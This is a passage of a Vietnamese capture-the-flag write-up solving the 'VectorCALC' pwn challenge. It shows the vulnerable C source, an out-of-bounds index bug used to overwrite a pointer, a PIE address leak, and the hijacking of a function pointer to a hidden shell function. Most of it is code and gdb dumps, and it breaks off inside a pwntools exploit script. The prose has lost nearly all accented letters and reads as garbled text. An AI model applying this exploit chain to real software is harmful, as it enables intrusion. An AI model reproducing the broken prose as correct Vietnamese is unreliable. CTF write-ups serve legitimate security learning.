</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;</span> MAX_VECTORS){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    v <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>v_list[idx];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    v<span style="color:#f92672">-&gt;</span>printFunc <span style="color:#f92672">=</span> printData;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter x: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%lu&#34;</span>,<span style="color:#f92672">&amp;</span>v<span style="color:#f92672">-&gt;</span>x);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter y: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%lu&#34;</span>,<span style="color:#f92672">&amp;</span>v<span style="color:#f92672">-&gt;</span>y);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">printData</span>(<span style="color:#66d9ef">struct</span> Vector<span style="color:#f92672">*</span> v){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Data: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;v = [%lu %lu]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,v<span style="color:#f92672">-&gt;</span>x,v<span style="color:#f92672">-&gt;</span>y);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sumVector</span>(){
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Save the sum to index: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%lu&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;</span> MAX_VECTORS){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    sum <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>v_list[idx];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(__uint64_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; i <span style="color:#f92672">&lt;</span> MAX_VECTORS ;<span style="color:#f92672">++</span>i){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>( i <span style="color:#f92672">!=</span> idx){
</span></span><span style="display:flex;"><span>            ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>x <span style="color:#f92672">+=</span> v_list[idx].x;
</span></span><span style="display:flex;"><span>            ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>y <span style="color:#f92672">+=</span> v_list[idx].y;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">loadFavorite</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(sum <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;You must set the sum before!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Index: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%lu&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;=</span> MAX_FAVES){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    faves[idx] <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> Vector));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span>printFunc <span style="color:#f92672">=</span> printData;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(faves[idx],<span style="color:#f92672">&amp;</span>sum[idx], <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> Vector));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">printFavorite</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(sum <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;You must set the sum before!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Index: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%lu&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;=</span> MAX_FAVES <span style="color:#f92672">||</span> faves[idx] <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>( ((__uint64_t <span style="color:#f92672">*</span>)faves[idx])[<span style="color:#ae81ff">2</span>] )
</span></span><span style="display:flex;"><span>        ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">printFunc</span>(faves[idx]);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> 
</span></span><span style="display:flex;"><span>        ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">printFunc</span>(faves[idx]);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">addFavorute</span>(){
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Index: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%lu&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;=</span> MAX_FAVES <span style="color:#f92672">||</span> faves[idx] <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>x <span style="color:#f92672">+=</span> ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span>x;
</span></span><span style="display:flex;"><span>    ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>y <span style="color:#f92672">+=</span> ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span>y;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setbuf</span>(stdin,NULL);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setbuf</span>(stdout,NULL);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(__uint64_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; i <span style="color:#f92672">&lt;</span> MAX_VECTORS ;<span style="color:#f92672">++</span>i){
</span></span><span style="display:flex;"><span>        v_list[i].printFunc <span style="color:#f92672">=</span> printData;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">printMenu</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;1. Enter data.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;2. Sum vector.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;3. Print sum vector</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;4. Save sum to favorite</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;5. Print favorite</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;6. Add favorite to the sum</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&gt; &#34;</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> argv, <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> envp){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">init</span>();
</span></span><span style="display:flex;"><span>    __uint32_t choice ;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printMenu</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%u&#34;</span>, <span style="color:#f92672">&amp;</span>choice);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">switch</span> (choice)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">enterData</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">sumVector</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">printFunc</span>(sum);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">loadFavorite</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printFavorite</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">6</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">addFavorute</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invaild option!&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">w1n</span>(); <span style="color:#75715e">// try to view the code in a disassembler :)
</span></span></span></code></pre></div><p>Ban u, dng checksec()  kim tra cc ch  bo v ca file:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>   ~/CTF/wannagame/calc                                                                                                        INT  31m 0s  03:54:35 
</span></span><span style="display:flex;"><span> checksec chall                                                                                                                                          
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/w1n-gl0ry/CTF/wannagame/calc/chall&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
</span></span><span style="display:flex;"><span>    Stack:    Canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
</span></span></code></pre></div><p>Full ch  c bt!</p>
<p>Nhn s qua th ta thy chng trnh khai bo 1 <code>struct Vector</code> c dng gm 2 s nguyn khng du v 1 con tr n hm nhn tham s kiu (struct Vector*)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> Vector{
</span></span><span style="display:flex;"><span>__uint64_t x;
</span></span><span style="display:flex;"><span>__uint64_t y;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>printFunc)(<span style="color:#66d9ef">struct</span> Vector<span style="color:#f92672">*</span>);
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>Tip tc, mng <code>v_list</code> cha ti a 3 phn t kiu <code>Vector</code>, bin con tr <code>sum</code> v mng cha ti a 4 con tr <code>faves</code></p>
<p>n y th cha c g r rng, ta tip tc vo cc chc nng chnh ca chng trnh, ta c th khi qut li nh sau:</p>
<pre><code>Hm enterData(): Nhp vo index mun m mnh mun nhp cc ch s x, y ca struct v , nu index &gt; 3 -&gt; exit 
Hm printData(): Dng  in ra mn hnh 2 ch s x, y ca struct
Hm sumVector(): Dng  lu tng tt c cc ch s x, y (khng bao gm ch s ca index c chn), index c chn s l ni  lu tng ca cc ch s x, y
Hm loadFavorite(): Nhp vo index ca struct m ta mun lu trn heap bng cch gi malloc(sizeof(struct Vector)) ri lu a ch trn mng con tr faves[index]  c khai bo u chng trnh
Hm printFavorite(): In ra 2 ch s x,y trn heap va lu
Hm addFavorute(): cng vo 2 ch s x, y bin con tr sum cha 1 struct ca mng v_list vi 2 ch s x, y trn heap ti index m ta nhp vo
</code></pre>
<p>-&gt; Nh  phn tch trn, chng trnh ch n gin c 6 chc nng, ta tin hnh tm bug  thc hin khai thc</p>
<p>Nhn qua th c v khng c bug g, nhng fuzz 1 hi, mnh   l  hm <code>enterData()</code>, chng trnh thc hin check index ca mnh nhp vo, nhng li khng check khi index bng 3 -&gt; Dn ti li OOB, da vo  ta c th ghi  bin <code>sum</code> cc a ch hp l  c th khai thc</p>
<p>Mnh tin hnh debug bng <code>gdb()</code>  kim tra tht s l mnh c th ghi  bin sum khng, v sau y l kt qu khi mnh nhp index 3:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>09:0048  0x555555558088 <span style="color:#f92672">(</span>sum<span style="color:#f92672">)</span>  0xdeadbeef
</span></span><span style="display:flex;"><span>0a:0050  0x555555558090  0xdeadbeef
</span></span><span style="display:flex;"><span>0b:0058  0x555555558098  0x55555555535d <span style="color:#f92672">(</span>printData<span style="color:#f92672">)</span>  endbr64 
</span></span></code></pre></div><p>-&gt; Tht s, mnh c th ghi  bin sum, y l mu cht quan trng  mnh thc hin cc bc tip theo</p>
<p>Nhng  vit vo bin <code>sum</code> 1 a ch hp l th trc ht ta phi cn c a ch base ca PIE, v cng c th leak a ch libc() base nu chng ta khng c a ch ca hm no tht s exploit c trong binary.</p>
<p>V may mn thay, mnh tm thy trong file binary c hm <code>w1n()</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">w1n</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh 1&gt;/dev/null&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>-&gt; ta khng cn phi leak libc v chng ta c th iu khin 1 con tr hm ti y  c shell :&raquo;&gt;</p>
<p>Vy, Lm sao  leak PIE??</p>
<p>Sau 1 hi lu m mm th mnh cng tm c 1 bug kh l hay trong hm <code>loadFavorite()</code>  c th leak PIE !</p>
<p>Cng nhn li hm <code>loadFavorite()</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>faves[idx] <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> Vector));
</span></span><span style="display:flex;"><span>((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span>printFunc <span style="color:#f92672">=</span> printData;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(faves[idx],<span style="color:#f92672">&amp;</span>sum[idx], <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> Vector));
</span></span></code></pre></div><p>Nu index=2, nu bin <code>sum</code> ang cha a ch ca struct th 2 trong mng <code>v_list</code> -&gt; <code>&amp;sum[2] -&gt; v_list+64</code> hay l <code>&amp;sum[2]-&gt;v_list[8]</code> v khi thc hin <code>memcpy()</code> th trn chunk <code>faves[2]</code> s cha a ch hm <code>print</code> trn ch s x v a ch ca <code>v_list[2]</code> trn ch s y ca chunk <code>faves[2]</code></p>
<p>Hin thc ha iu trn:</p>
<pre tabindex="0"><code>00:0000  0x555555558040 (v_list)  0xdeadbeef
01:0008  0x555555558048 (v_list+8)  0xdeadbeef
02:0010  0x555555558050 (v_list+16)  0x55555555535d (printData)  endbr64 
03:0018  0x555555558058 (v_list+24)  0xdeadbeef
04:0020  0x555555558060 (v_list+32)  0xdeadbeef
05:0028  0x555555558068 (v_list+40)  0x55555555535d (printData)  endbr64 
06:0030  0x555555558070 (v_list+48)  0xdeadbeef
07:0038  0x555555558078 (v_list+56)  0xdeadbeef
08:0040  0x555555558080 (v_list+64)  0x55555555535d (printData)  endbr64 
09:0048  0x555555558088 (sum)  0x555555558070 (v_list+48)  0xdeadbeef
</code></pre><p>-&gt; Trn *faves[2]  cha cc a ch m ta cn</p>
<pre tabindex="0"><code>0:0000  0x5555555592a0  0x55555555535d (printData)  endbr64 
01:0008  0x5555555592a8  0x555555558070 (v_list+48)  0x37ab6fbbc
02:0010  0x5555555592b0  0x0
</code></pre><p>-&gt; T , khi ta dng hm <code>printFavorite()</code> th th chng ta c c  l a ch ca mng <code>v_list</code> v a ch ca hm <code>print</code> l ta s c c a ch ca PIE</p>
<pre tabindex="0"><code>Index: 2
Data: 
v = [93824992236381 93824992247920]
</code></pre><p>-&gt; Thnh cng leak c PIE base</p>
<p>By gi, ta  c PIE base, iu cn lm l lm sao iu khin c RIP tr vo hm <code>w1n()</code></p>
<p>Options 3 s tr li cu hi ca ta:</p>
<p><code>((struct Vector *)sum)-&gt;printFunc(sum);</code></p>
<p>Chng ta c th iu khin bin <code>sum</code> tr vo bt c u nh vo bug OOB  trn</p>
<p>Vy th chng ta s vit hm <code>w1n()</code> vo 1 index no  trn <code>v_list()</code> ri ghi  sum tr vo trc  16 bytes th chng ta  c th c c shell !!!!!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0000</span><span style="color:#960050;background-color:#1e0010"></span>  <span style="color:#ae81ff">0x558c60655040</span> (v_list) <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">0x558c606529d2</span> (w1n) <span style="color:#960050;background-color:#1e0010"></span> endbr64 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span><span style="color:#f92672">:</span><span style="color:#ae81ff">000</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010"></span>  <span style="color:#ae81ff">0x558c60655048</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>) <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">0x558c606529d2</span> (w1n) <span style="color:#960050;background-color:#1e0010"></span> endbr64 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0010</span><span style="color:#960050;background-color:#1e0010"></span>  <span style="color:#ae81ff">0x558c60655050</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>) <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">0x558c6065235d</span> (printData) <span style="color:#960050;background-color:#1e0010"></span> endbr64 
</span></span></code></pre></div><p>Lc ny ghi  sum bng v_list[3] thnh <code>v_list-16</code> sau  trigger  gi hm w1n</p>
<pre tabindex="0"><code>0x558c6065298c &lt;main+173&gt;    call   rdx                           &lt;w1n&gt;
        rdi: 0x558c60655030 (stdin@GLIBC_2.2.5)  0x7fdff7ff6aa0 (_IO_2_1_stdin_)  0xfbad208b
        rsi: 0x3
        rdx: 0x558c606529d2 (w1n)  endbr64 
        rcx: 0x0
</code></pre><p>Vy l trn Local mnh  exploit thnh cng, mnh tin hnh gi ln server thng qua script sau:
Vector Exploit:
<a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/pwn/VectorCALC/xpl.py">xpl.py</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#context.log_level=&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">=</span>process(<span style="color:#e6db74">&#39;./chall&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#io=remote(&#39;45.122.249.68&#39;, 20017)</span>
</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">=</span>context<span style="color:#f92672">.</span>binary<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./chall&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#gdb.attach(io)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">enter</span>(idx, x, y):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>, idx)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter x: &#39;</span>, x)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter y: &#39;</span>, y)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sumVector</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Save the sum to index: &#39;</span>, idx)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">printsum</span>():
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">loadfav</span>(idx):
